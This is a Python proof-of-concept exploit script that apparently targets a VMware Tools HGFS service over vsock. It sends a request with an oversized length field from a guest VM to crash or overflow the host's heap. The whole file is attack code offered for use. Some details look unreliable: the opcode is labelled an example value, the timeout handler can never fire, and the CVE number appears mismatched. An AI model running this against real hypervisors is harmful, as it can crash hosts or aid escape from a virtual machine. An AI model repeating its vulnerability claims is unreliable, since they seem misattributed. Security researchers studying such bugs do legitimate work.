#!/usr/bin/env python3
"""
PoC for VMware Tools HGFS vsock overflow
CVE-2016-5338

Connects to the host’s HGFS service over AF_VSOCK and sends
a malformed request with an oversized length field, triggering
a heap overflow in the host-side HGFS handler.
"""

import socket
import struct

# Linux vsock constants (socket.AF_VSOCK may be missing in older Python)
AF_VSOCK        = getattr(socket, "AF_VSOCK", 40)
VMADDR_CID_HOST = 2                  # CID 0x2 == the host
HGFS_VSOCK_PORT = 0x4003             # HGFS service port (16387)

def build_hgfs_header(opcode: int, length: int) -> bytes:
    # HGFS packet header: little-endian <opcode:uint32><length:uint32>
    return struct.pack("<II", opcode, length)

def main():
    # 1) Open a vsock stream to the host’s HGFS listener
    s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
    s.connect((VMADDR_CID_HOST, HGFS_VSOCK_PORT))
    print(f"[+] Connected to HGFS @ vsock {VMADDR_CID_HOST}:{HGFS_VSOCK_PORT}")

    # 2) Craft header: choose an operation code and an enormous length
    OPCODE_READ = 5                    # e.g. HGFS_OP_READ request (example value)
    MAL_LEN     = 0xFFFFFFFF           # overflow-triggering length
    hdr = build_hgfs_header(OPCODE_READ, MAL_LEN)
    print(f"[+] Sending header: opcode=0x{OPCODE_READ:02x}, length=0x{MAL_LEN:08x}")

    # 3) Transmit and (optionally) read any response
    s.sendall(hdr)
    try:
        resp = s.recv(1024)
        print(f"[+] Host responded: {resp!r}")
    except socket.timeout:
        print("[!] No response (likely crashed/overflowed)")
    finally:
        s.close()

if __name__ == "__main__":
    main()